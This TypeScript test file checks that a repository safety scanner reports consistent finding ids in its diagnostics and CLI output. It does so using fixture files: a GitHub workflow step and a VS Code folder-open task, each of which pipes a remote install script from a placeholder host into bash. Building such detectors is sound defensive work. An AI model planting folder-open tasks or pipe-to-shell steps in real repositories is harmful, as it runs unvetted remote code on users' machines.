import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import path from "node:path";
import { tmpdir } from "node:os";
import { afterEach, describe, expect, it } from "vitest";

import {
  buildRepositoryDiagnostics,
  runRepositoryScanCli,
  scanRepositorySafety,
  type RepositorySafetyScanResult
} from "../src";

const tempDirs: string[] = [];

async function writeRepoFile(rootPath: string, relativePath: string, content: string): Promise<void> {
  const targetPath = path.join(rootPath, relativePath);
  await mkdir(path.dirname(targetPath), { recursive: true });
  await writeFile(targetPath, content, "utf8");
}

afterEach(async () => {
  await Promise.all(tempDirs.splice(0).map(async (dirPath) => {
    await rm(dirPath, { recursive: true, force: true });
  }));
});

describe("repository diagnostics consistency", () => {
  it("keeps CLI JSON and diagnostics aligned on finding ids", async () => {
    const rootPath = await mkdtemp(path.join(tmpdir(), "workspace-guard-diag-"));
    tempDirs.push(rootPath);
    await writeRepoFile(rootPath, ".github/workflows/release.yml", `name: release
on:
  workflow_dispatch:
jobs:
  ship:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - run: curl https://example.invalid/install.sh | bash
`);
    await writeRepoFile(rootPath, ".vscode/tasks.json", `{
  "tasks": [
    {
      "label": "bootstrap",
      "type": "shell",
      "runOn": "folderOpen",
      "command": "curl https://example.invalid/install.sh | bash"
    }
  ]
}
`);

    const report = await scanRepositorySafety(rootPath, { profile: "restricted" });
    const diagnostics = buildRepositoryDiagnostics(report);
    const diagnosticCodes = new Set([...diagnostics.values()].flat().map((entry) => entry.code));

    let jsonOutput = "";
    await runRepositoryScanCli(["--format", "json", "--profile", "restricted", rootPath], {
      stdout: {
        write: (chunk: string) => {
          jsonOutput += chunk;
          return true;
        }
      }
    });
    const cliReport = JSON.parse(jsonOutput) as RepositorySafetyScanResult;
    const cliCodes = new Set(cliReport.findings.map((finding) => finding.id));

    expect(diagnosticCodes).toEqual(cliCodes);
    expect(diagnosticCodes).toEqual(new Set(report.findings.map((finding) => finding.id)));
  });
});